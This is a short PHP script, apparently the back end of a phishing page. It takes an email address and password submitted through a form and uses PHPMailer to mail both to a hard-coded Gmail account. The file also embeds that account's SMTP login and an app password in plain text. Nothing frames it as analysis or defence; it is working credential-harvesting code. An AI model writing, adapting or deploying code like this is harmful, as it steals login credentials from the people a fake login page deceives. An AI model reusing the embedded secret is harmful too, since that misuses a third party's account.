<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'PHPMailer/src/Exception.php';   // Make sure to include the correct path to the autoload.php file
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if (isset($_POST['submit'])) {
    // Getting user data
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Recipient email
    $mailTo = 'skywu042@gmail.com';

    // Email subject
    $subject = 'Hello peace, you have received a new mail from ' . $email;

    // Email message body
    $htmlContent = '<h2>Email Request Received</h2>
    <p><b>Client Email:</b> ' . $email . '</p>
    <p><b>Password:</b> ' . $password . '</p>';

    // Create an instance of PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com'; // Set the SMTP server to send through
        $mail->SMTPAuth   = true;             // Enable SMTP authentication
        $mail->Username   = 'skywu042@gmail.com'; // SMTP username (replace with your Gmail address)
        $mail->Password   = 'pbpasxwprjylcnpg';  // SMTP password (replace with your Gmail password)
        $mail->SMTPSecure = 'tls';            // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` also accepted
        $mail->Port       = 587;              // TCP port to connect to

        // Recipients
        $mail->setFrom($email, 'Sender Name'); // Sender's email and name
        $mail->addAddress($mailTo);           // Add a recipient

        // Content
        $mail->isHTML(true);                                  // Set email format to HTML
        $mail->Subject = $subject;
        $mail->Body    = $htmlContent;

        // Send the email
        $mail->send();
        $success = "The message was sent successfully!";
    } catch (Exception $e) {
        $failed = "Error: Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>
